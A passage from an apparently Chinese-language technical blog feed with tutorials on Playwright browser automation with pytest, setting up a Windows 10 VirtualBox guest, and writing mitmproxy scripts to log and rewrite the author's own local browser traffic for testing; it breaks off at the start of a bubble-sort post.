<li><a href="https://playwright.dev/python/docs/api/class-browser#browser-new-context">browser.new_context(**kwargs)</a></li>
</ul>
<h3 id="Page-和-Frame"><a href="#Page-和-Frame" class="headerlink" title="Page 和 Frame"></a>Page 和 Frame</h3><ul>
<li>一个BrowserContext可以有多个page，每个page代表一个tab或者一个弹窗。page用于导航到URL并与page内的内容交互。创建page:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page = context.new_page()</span><br><span class="line"> </span><br><span class="line"># Navigate explicitly, similar to entering a URL in the browser.</span><br><span class="line">page.goto(&#x27;http://example.com&#x27;)</span><br><span class="line"># Fill an input.</span><br><span class="line">page.fill(&#x27;#search&#x27;, &#x27;query&#x27;)</span><br><span class="line"> </span><br><span class="line"># Navigate implicitly by clicking a link.</span><br><span class="line">page.click(&#x27;#submit&#x27;)</span><br><span class="line"># Expect a new url.</span><br><span class="line">print(page.url)</span><br><span class="line"> </span><br><span class="line"># Page can navigate from the script - this will be picked up by Playwright.</span><br><span class="line"># window.location.href = &#x27;https://example.com&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>一个page可以有多个frame对象，但只有一个主frame，所有page-level的操作(比如click），都是作用在主frame上的。page的其他frame会打上<code>iframe</code> HTML标签，这些frame可以在内部操作实现访问。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过name属性获取frame</span></span><br><span class="line">frame = page.frame(<span class="string">&#x27;frame-login&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 通过URL获取frame</span></span><br><span class="line">frame = page.frame(url=<span class="string">r&#x27;.*domain.*&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 通过其他选择器(selector)获取frame</span></span><br><span class="line">frame_element_handle = page.query_selector(<span class="string">&#x27;.frame-class&#x27;</span>)</span><br><span class="line">frame = frame_element_handle.content_frame()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 与frame交互</span></span><br><span class="line">frame.fill(<span class="string">&#x27;#username-input&#x27;</span>, <span class="string">&#x27;John&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>在录制模式下，会自动识别是否是frame内的操作，不好定位frame时，那么可以使用录制模式来找。</li>
</ul>
<p>API：</p>
<ul>
<li><a href="https://playwright.dev/python/docs/api/class-page">Page</a></li>
<li><a href="https://playwright.dev/python/docs/api/class-frame">Frame</a></li>
<li><a href="https://playwright.dev/python/docs/api/class-page#page-frame">page.frame(**kwargs</a></li>
</ul>
<h3 id="Selector"><a href="#Selector" class="headerlink" title="Selector"></a>Selector</h3><ul>
<li><p>playwright可以通过 CSS selector, XPath selector, HTML 属性（比如 <code>id</code>, <code>data-test-id）或者是文本内容</code>定位元素。</p>
</li>
<li><p>除了xpath selector外，所有selector默认都是指向shadow DOM，如果要指向常规DOM，可使用*:light。不过通常不需要。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Using data-test-id= selector engine</span></span><br><span class="line">page.click(<span class="string">&#x27;data-test-id=foo&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># CSS and XPath selector engines are automatically detected</span></span><br><span class="line">page.click(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">page.click(<span class="string">&#x27;//html/body/div&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Find node by text substring</span></span><br><span class="line">page.click(<span class="string">&#x27;text=Hello w&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Explicit CSS and XPath notation</span></span><br><span class="line">page.click(<span class="string">&#x27;css=div&#x27;</span>)</span><br><span class="line">page.click(<span class="string">&#x27;xpath=//html/body/div&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Only search light DOM, outside WebComponent shadow DOM:</span></span><br><span class="line">page.click(<span class="string">&#x27;css:light=div&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 不同的selector可组合使用，用 &gt;&gt;连接</span></span><br><span class="line"><span class="comment"># Click an element with text &#x27;Sign Up&#x27; inside of a #free-month-promo.</span></span><br><span class="line">page.click(<span class="string">&#x27;#free-month-promo &gt;&gt; text=Sign Up&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Capture textContent of a section that contains an element with text &#x27;Selectors&#x27;.</span></span><br><span class="line">section_text = page.eval_on_selector(<span class="string">&#x27;*css=section &gt;&gt; text=Selectors&#x27;</span>, <span class="string">&#x27;e =&gt; e.textContent&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>详细：</p>
<p><a href="https://playwright.dev/python/docs/selectors/">Element selectors | Playwright Python</a></p>
<h3 id="Auto-waiting"><a href="#Auto-waiting" class="headerlink" title="Auto-waiting"></a>Auto-waiting</h3><ul>
<li><p>playwright在执行操作之前对元素执行一系列可操作性检查，以确保这些行动按预期运行。它会自动等待（auto-wait）所有相关检查通过，然后才执行请求的操作。如果所需的检查未在给定的范围内通过timeout，则操作将失败并显示TimeoutError </p>
</li>
<li><p>如 page.click(selector, **kwargs) 和 page.fill(selector, value, **kwargs) 这样的操作会执行auto-wait ，等待元素变成可见（visible）和 可操作（ actionable）。例如，click将会:</p>
<ul>
<li><p>等待selectorx选定元素出现在 DOM 中</p>
</li>
<li><p>待它变得可见（visible）：有非空的边界框且没有 <code>visibility:hidden</code></p>
</li>
<li><p>等待它停止移动：例如，等待 css 过渡（css transition）完成</p>
</li>
<li><p>将元素滚动到视图中</p>
</li>
<li><p>等待它在动作点接收点事件：例如，等待元素不被其他元素遮挡</p>
</li>
<li><p>如果在上述任何检查期间元素被分离，则重试</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Playwright waits for #search element to be in the DOM</span></span><br><span class="line">page.fill(<span class="string">&#x27;#search&#x27;</span>, <span class="string">&#x27;query&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Playwright waits for element to stop animating</span></span><br><span class="line"><span class="comment"># and accept clicks.</span></span><br><span class="line">page.click(<span class="string">&#x27;#search&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#也可显示执行等待动作</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Wait for #search to appear in the DOM.</span></span><br><span class="line">page.wait_for_selector(<span class="string">&#x27;#search&#x27;</span>, state=<span class="string">&#x27;attached&#x27;</span>)</span><br><span class="line"><span class="comment"># Wait for #promo to become visible, for example with `visibility:visible`.</span></span><br><span class="line">page.wait_for_selector(<span class="string">&#x27;#promo&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Wait for #details to become hidden, for example with `display:none`.</span></span><br><span class="line">page.wait_for_selector(<span class="string">&#x27;#details&#x27;</span>, state=<span class="string">&#x27;hidden&#x27;</span>)</span><br><span class="line"><span class="comment"># Wait for #promo to be removed from the DOM.</span></span><br><span class="line">page.wait_for_selector(<span class="string">&#x27;#promo&#x27;</span>, state=<span class="string">&#x27;detached&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Execution-context"><a href="#Execution-context" class="headerlink" title="Execution context"></a>Execution context</h3><ul>
<li>API <a href="https://playwright.dev/python/docs/api/class-page#page-evaluate">page.evaluate(expression, **kwargs)</a> 可以用来运行web页面中的 JavaScript函数，并将结果返回到plarywright环境中。浏览器的全局变量，如 <code>window</code> 和 <code>document，</code> 可用于 <code>evaluate。</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">href = page.evaluate(<span class="string">&#x27;() =&gt; document.location.href&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># if the result is a Promise or if the function is asynchronous evaluate will automatically wait until it&#x27;s resolved</span></span><br><span class="line"> </span><br><span class="line">status = page.evaluate(<span class="string">&quot;&quot;&quot;async () =&gt; &#123;</span></span><br><span class="line"><span class="string">  response = fetch(location.href)</span></span><br><span class="line"><span class="string">  return response.status</span></span><br><span class="line"><span class="string">&#125;&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Evaluation-Argument"><a href="#Evaluation-Argument" class="headerlink" title="Evaluation Argument"></a>Evaluation Argument</h3><ul>
<li><a href="https://playwright.dev/python/docs/api/class-page#page-evaluate">page.evaluate(expression, **kwargs)</a> 方法接收单个可选参数。此参数可以是<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify#Description">Serializable</a>值和<a href="https://playwright.dev/python/docs/api/class-jshandle">JSHandle</a>或<a href="https://playwright.dev/python/docs/api/class-elementhandle">ElementHandle</a>实例的混合。句柄会自动转换为它们所代表的值</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = page.evaluate(<span class="string">&quot;([x, y]) =&gt; Promise.resolve(x * y)&quot;</span>, [<span class="number">7</span>, <span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span>(result) <span class="comment"># prints &quot;56&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(page.evaluate(<span class="string">&quot;1 + 2&quot;</span>)) <span class="comment"># prints &quot;3&quot;</span></span><br><span class="line">x = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(page.evaluate(<span class="string">f&quot;1 + <span class="subst">&#123;x&#125;</span>&quot;</span>)) <span class="comment"># prints &quot;11&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">body_handle = page.query_selector(<span class="string">&quot;body&quot;</span>)</span><br><span class="line">html = page.evaluate(<span class="string">&quot;([body, suffix]) =&gt; body.innerHTML + suffix&quot;</span>, [body_handle, <span class="string">&quot;hello&quot;</span>])</span><br><span class="line">body_handle.dispose()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># A primitive value.</span></span><br><span class="line">page.evaluate(<span class="string">&#x27;num =&gt; num&#x27;</span>, <span class="number">42</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># An array.</span></span><br><span class="line">page.evaluate(<span class="string">&#x27;array =&gt; array.length&#x27;</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"> </span><br><span class="line"><span class="comment"># An object.</span></span><br><span class="line">page.evaluate(<span class="string">&#x27;object =&gt; object.foo&#x27;</span>, &#123; <span class="string">&#x27;foo&#x27;</span>: <span class="string">&#x27;bar&#x27;</span> &#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># A single handle.</span></span><br><span class="line">button = page.query_selector(<span class="string">&#x27;button&#x27;</span>)</span><br><span class="line">page.evaluate(<span class="string">&#x27;button =&gt; button.textContent&#x27;</span>, button)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Alternative notation using elementHandle.evaluate.</span></span><br><span class="line">button.evaluate(<span class="string">&#x27;(button, from) =&gt; button.textContent.substring(from)&#x27;</span>, <span class="number">5</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Object with multiple handles.</span></span><br><span class="line">button1 = page.query_selector(<span class="string">&#x27;.button1&#x27;</span>)</span><br><span class="line">button2 = page.query_selector(<span class="string">&#x27;.button2&#x27;</span>)</span><br><span class="line">page.evaluate(<span class="string">&quot;&quot;&quot;o =&gt; o.button1.textContent + o.button2.textContent&quot;&quot;&quot;</span>,</span><br><span class="line">    &#123; <span class="string">&#x27;button1&#x27;</span>: button1, <span class="string">&#x27;button2&#x27;</span>: button2 &#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Object destructuring works. Note that property names must match</span></span><br><span class="line"><span class="comment"># between the destructured object and the argument.</span></span><br><span class="line"><span class="comment"># Also note the required parenthesis.</span></span><br><span class="line">page.evaluate(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    (&#123; button1, button2 &#125;) =&gt; button1.textContent + button2.textContent&quot;&quot;&quot;</span>,</span><br><span class="line">    &#123; <span class="string">&#x27;button1&#x27;</span>: button1, <span class="string">&#x27;button2&#x27;</span>: button2 &#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Array works as well. Arbitrary names can be used for destructuring.</span></span><br><span class="line"><span class="comment"># Note the required parenthesis.</span></span><br><span class="line">page.evaluate(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ([b1, b2]) =&gt; b1.textContent + b2.textContent&quot;&quot;&quot;</span>,</span><br><span class="line">    [button1, button2])</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Any non-cyclic mix of serializables and handles works.</span></span><br><span class="line">page.evaluate(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    x =&gt; x.button1.textContent + x.list[0].textContent + String(x.foo)&quot;&quot;&quot;</span>,</span><br><span class="line">    &#123; <span class="string">&#x27;button1&#x27;</span>: button1, <span class="string">&#x27;list&#x27;</span>: [button2], <span class="string">&#x27;foo&#x27;</span>: <span class="literal">None</span> &#125;)</span><br></pre></td></tr></table></figure>

<h2 id="结合pytest"><a href="#结合pytest" class="headerlink" title="结合pytest"></a>结合pytest</h2><ul>
<li>testcas\conftest.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"><span class="keyword">from</span> py._xmlgen <span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@pytest.fixture()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">browser</span>():</span><br><span class="line">    playwrigh = sync_playwright().start()</span><br><span class="line">    browser = playwrigh.chromium.launch(headless=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回数据</span></span><br><span class="line">    <span class="keyword">yield</span> browser</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实现用例后置</span></span><br><span class="line">    browser.close()</span><br><span class="line">    playwrigh.stop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@pytest.mark.hookwrapper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_runtest_makereport</span>(<span class="params">item, call</span>):</span><br><span class="line">    outcome = <span class="keyword">yield</span></span><br><span class="line">    report = outcome.get_result()</span><br><span class="line">    report.description = <span class="built_in">str</span>(item.function.__doc__)</span><br><span class="line">    report.nodeid = report.nodeid.encode(<span class="string">&quot;utf-8&quot;</span>).decode(<span class="string">&quot;unicode_escape&quot;</span>)  <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_results_table_header</span>(<span class="params">cells</span>):</span><br><span class="line">    cells.insert(<span class="number">1</span>, html.th(<span class="string">&#x27;用例名称&#x27;</span>))</span><br><span class="line">    cells.insert(<span class="number">2</span>, html.th(<span class="string">&#x27;Test_nodeid&#x27;</span>))</span><br><span class="line">    cells.pop(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_results_table_row</span>(<span class="params">report, cells</span>):</span><br><span class="line">    cells.insert(<span class="number">1</span>, html.td(report.description))</span><br><span class="line">    cells.insert(<span class="number">2</span>, html.td(report.nodeid))</span><br><span class="line">    cells.pop(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_results_table_html</span>(<span class="params">report, data</span>):</span><br><span class="line">    <span class="keyword">if</span> report.passed:</span><br><span class="line">        <span class="keyword">del</span> data[:]</span><br><span class="line">        data.append(html.div(<span class="string">&#x27;通过的用例未捕获日志输出.&#x27;</span>, class_=<span class="string">&#x27;empty log&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_report_title</span>(<span class="params">report</span>):</span><br><span class="line">    report.title = <span class="string">&quot;pytest示例项目测试报告&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>testcase\test1.py，<code>page.request.ge</code>t可以直接发送请求</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pytest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TestClassName:</span><br><span class="line">    @pytest.mark.usefixtures(&quot;browser&quot;)</span><br><span class="line">    def test_func_name1(self, browser):</span><br><span class="line">        context = browser.new_context()</span><br><span class="line">        page = context.new_page()</span><br><span class="line">        # 发送http请求</span><br><span class="line">        resp = page.request.get(&quot;http://www.kuaidi100.com/query?type=&quot;)</span><br><span class="line">        print(resp.text())</span><br><span class="line">        page.goto(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">        assert page.title() == &quot;百度一下，你就知道&quot;</span><br><span class="line">        </span><br><span class="line">        page.locator(&quot;input[name=\&quot;wd\&quot;]&quot;).click()</span><br><span class="line">        page.locator(&quot;input[name=\&quot;wd\&quot;]&quot;).fill(&quot;python&quot;)</span><br><span class="line">        page.get_by_role(&quot;button&quot;, name=&quot;百度一下&quot;).click()</span><br><span class="line">        context.close()</span><br><span class="line"></span><br><span class="line">    @pytest.mark.usefixtures(&quot;browser&quot;)</span><br><span class="line">    def test_func_name1_1(self, browser):</span><br><span class="line">        context = browser.new_context()</span><br><span class="line">        page = context.new_page()</span><br><span class="line">        page.goto(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">        assert page.title() == &quot;百度一下，你就知道1&quot;</span><br><span class="line">        page.locator(&quot;input[name=\&quot;wd\&quot;]&quot;).click()</span><br><span class="line">        page.locator(&quot;input[name=\&quot;wd\&quot;]&quot;).fill(&quot;python&quot;)</span><br><span class="line">        page.get_by_role(&quot;button&quot;, name=&quot;百度一下&quot;).click()</span><br><span class="line">        context.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>执行用例</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 批量运行用例</span><br><span class="line">pytest -s testcase\  --html=report.html --self-contained-html --capture=sys</span><br><span class="line"></span><br><span class="line"># 多线程运行用例 </span><br><span class="line">pip install pytest-multithreading -i https://pypi.douban.com/simple</span><br><span class="line">pytest -s testcase/ --th 10 --html=report.html --self-contained-html --capture=sys</span><br></pre></td></tr></table></figure>

<ul>
<li>查看执行结果</li>
</ul>
<p><img src="/aposts/b0b7e6c8/image-20221011152104439.png" alt="image-20221011152104439"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li>如何集成到CI上待实践</li>
<li>关于多机并行，可以多进程去启动，也可以在CI上新建几个节点去执行</li>
</ul>
]]></content>
      <categories>
        <category>playwright</category>
      </categories>
      <tags>
        <tag>自动化测试</tag>
        <tag>playwright</tag>
      </tags>
  </entry>
  <entry>
    <title>win10下装虚拟机</title>
    <url>/aposts/9b3814ef/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>为了模拟分布式性能压测，本地搭建虚拟机达到模拟的方式</li>
<li>本机为win10</li>
</ul>
<p><img src="/aposts/9b3814ef/image-20211029110605615.png" alt="image-20211029110605615"></p>
<h2 id="下载win10-ios镜像"><a href="#下载win10-ios镜像" class="headerlink" title="下载win10 ios镜像"></a>下载win10 ios镜像</h2><ul>
<li><p>使用官网的<a href="https://www.microsoft.com/zh-cn/software-download/windows10/">下载地址</a></p>
<p><img src="/aposts/9b3814ef/image-20211029110819907.png" alt="image-20211029110819907"></p>
</li>
<li><p>打开工具选择ios文件即可，<strong>我一开始使用我之前存的ios文件一直安装不成功</strong></p>
<p><img src="/aposts/9b3814ef/image-20211029111449747.png" alt="image-20211029111449747"></p>
</li>
</ul>
<h2 id="下载Oracle-VM-VirtualBox"><a href="#下载Oracle-VM-VirtualBox" class="headerlink" title="下载Oracle VM VirtualBox"></a>下载Oracle VM VirtualBox</h2><ul>
<li><p>我的版本为6.1</p>
</li>
<li><p>安装步骤省略，再按照过程中出现弹框报错信息，里面包含类似于下面的错误</p>
<p><img src="/aposts/9b3814ef/image-20211029111956127.png" alt="image-20211029111956127"></p>
<ul>
<li>解决办法是禁用Hyper-V。以管理员权限打开 CMD 或 Windows PowerShell  ，输入如下命令：<code>bcdedit /set hypervisorlaunchtype off</code>再重启电脑</li>
</ul>
</li>
<li><p>启动虚拟机进行安装win10</p>
</li>
</ul>
<p><img src="/aposts/9b3814ef/image-20211029112134604.png" alt="image-20211029112134604"></p>
<h3 id="安装增强功能"><a href="#安装增强功能" class="headerlink" title="安装增强功能"></a>安装增强功能</h3><ul>
<li><p>安装次功能主要是为了方便虚拟机使用宿主机的共享文件夹</p>
</li>
<li><p>进入系统后我们点击VirtualBox菜单栏“设备”—-“安装增强功能”。</p>
</li>
</ul>
<p><img src="/aposts/9b3814ef/image-20211029152348003.png" alt="image-20211029152348003"></p>
<ul>
<li>然后进入VirtualBox虚拟系统的“我的电脑”找到光驱</li>
</ul>
<p><img src="/aposts/9b3814ef/image-20211029152501476.png" alt="image-20211029152501476"></p>
<ul>
<li><p>选择好对应的安装程序，打开开始安装</p>
<p><img src="/aposts/9b3814ef/image-20211029152536763.png" alt="image-20211029152536763"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 mitmproxy + python</title>
    <url>/aposts/8354ce0a/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
<li><p>本文来自<a href="https://blog.wolfogre.com/posts/usage-of-mitmproxy/">这里</a></p>
</li>
<li><p>mitmproxy 相比Charles、fiddler的优点在于，它可以命令行方式或脚本的方式进行mock mitmproxy不仅可以像Charles那样抓包，还可以对请求数据进行二次开发，进入高度二次定制</p>
</li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li>windows下安装，我本机的python版本为3.7</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> mitmproxy</span><br></pre></td></tr></table></figure>

<ul>
<li>完成后，系统将拥有 <code>mitmproxy</code>、<code>mitmdump</code>、<code>mitmweb</code> 三个命令，由于 <code>mitmproxy</code> 命令不支持在 windows 系统中运行（这没关系，不用担心），我们可以拿 <code>mitmdump</code> 测试一下安装是否成功，执行：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;mitmdump --version</span><br><span class="line">Mitmproxy: 5.3.0</span><br><span class="line">Python:    3.7.9</span><br><span class="line">OpenSSL:   OpenSSL 1.1.1h  22 Sep 2020</span><br><span class="line">Platform:  Windows-10-10.0.19041-SP0</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>要启动 <code>mitmproxy</code> 用 <code>mitmproxy</code>、<code>mitmdump</code>、<code>mitmweb</code> 这三个命令中的任意一个即可，这三个命令功能一致，且都可以加载自定义脚本，唯一的区别是交互界面的不同。</li>
</ul>
<h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p>原文中介绍了<code>HTTP</code>，<code>TCP</code>,<code>Websocket</code> 的生命周期，因为用<code>http</code>比较多，只需要用到 <code>http_connect</code>、<code>request</code>、<code>response</code> 三个事件就能完成大多数需求了。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><ul>
<li>启动mitmproxy</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mitmweb</span><br></pre></td></tr></table></figure>



<ul>
<li>cmd中启动chrome(启动前，需要先关闭所有chrome)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chrome.exe &quot; --proxy-server=127.0.0.1:8080 --ignore-certificate-errors</span><br></pre></td></tr></table></figure>

<p>新增三个代码文件分别为：</p>
<ul>
<li>counter.py，这里代码比较简单，就是发送请求前打印信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># counter.py</span><br><span class="line"></span><br><span class="line">import mitmproxy.http</span><br><span class="line">from mitmproxy import ctx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Counter:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.num = 0</span><br><span class="line"></span><br><span class="line">    def request(self, flow: mitmproxy.http.HTTPFlow):</span><br><span class="line">        self.num = self.num + 1</span><br><span class="line">        ctx.log.info(&quot;We&#x27;ve seen %d flows&quot; % self.num)</span><br></pre></td></tr></table></figure>

<ul>
<li>joker.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mitmproxy.http</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx, http</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Joker</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, flow: mitmproxy.http.HTTPFlow</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        对百度的搜索发送请求进行拦截，对wd参数修改为360搜索</span></span><br><span class="line"><span class="string">        :param flow:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> flow.request.host != <span class="string">&quot;www.baidu.com&quot;</span> <span class="keyword">or</span> <span class="keyword">not</span> flow.request.path.startswith(<span class="string">&quot;/s&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># for i in flow.request.query.keys():</span></span><br><span class="line">        <span class="comment">#     print(i)</span></span><br><span class="line">        <span class="comment"># 抓取请求参数可以看到wd传的是百度搜索的具体内容</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wd&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flow.request.query.keys():</span><br><span class="line">            ctx.log.warn(<span class="string">&quot;can not get search word from %s&quot;</span> % flow.request.pretty_url)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        ctx.log.info(<span class="string">&quot;catch search word: %s&quot;</span> % flow.request.query.get(<span class="string">&quot;wd&quot;</span>))</span><br><span class="line">        flow.request.query.set_all(<span class="string">&quot;wd&quot;</span>, [<span class="string">&quot;360搜索&quot;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">self, flow: mitmproxy.http.HTTPFlow</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        点击百度搜索中的so搜索后，把当期网页标题修改</span></span><br><span class="line"><span class="string">        :param flow:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> flow.request.host != <span class="string">&quot;www.so.com&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        text = flow.response.get_text()</span><br><span class="line">        <span class="comment"># 网页标题修改</span></span><br><span class="line">        text = text.replace(<span class="string">&quot;搜索&quot;</span>, <span class="string">&quot;请使用谷歌&quot;</span>)</span><br><span class="line">        flow.response.set_text(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">http_connect</span>(<span class="params">self, flow: mitmproxy.http.HTTPFlow</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        连接的请求为google，则把状态码改为404</span></span><br><span class="line"><span class="string">        :param flow: </span></span><br><span class="line"><span class="string">        :return: </span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flow.request.host == <span class="string">&quot;www.google.com&quot;</span>:</span><br><span class="line">            flow.response = http.HTTPResponse.make(<span class="number">404</span>)</span><br><span class="line">            <span class="comment"># 打印是否设置成功</span></span><br><span class="line">            <span class="built_in">print</span>(flow.response.status_code)</span><br></pre></td></tr></table></figure>

<ul>
<li>addons.py，这里代码比较简单，只是把自定义事件加载进来</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import counter</span><br><span class="line">import joker</span><br><span class="line"></span><br><span class="line">addons = [</span><br><span class="line">    counter.Counter(),</span><br><span class="line">    joker.Joker(),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<ul>
<li>运行mitmproxy</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mitmweb -s addons.py</span><br></pre></td></tr></table></figure>

<ul>
<li>输入你好，因为搜索关键字被替换为了so搜索，所以结果查到了so搜索</li>
</ul>
<p><img src="/aposts/8354ce0a/image-20221014183654649.png" alt="image-20221014183654649"></p>
<ul>
<li>点击360搜索首页，标题被修改了</li>
</ul>
<p><img src="/aposts/8354ce0a/image-20221014184000637.png" alt="image-20221014184000637"></p>
<ul>
<li>如果直接输入<a href="http://www.google.com,响应码直接为404/">www.google.com，响应码直接为404</a></li>
</ul>
<p><img src="/aposts/8354ce0a/image-20221014184051730.png" alt="image-20221014184051730"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>mitmproxy</tag>
      </tags>
  </entry>
  <entry>
    <title>冒泡排序</title>
    <url>/aposts/14e6f1eb/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
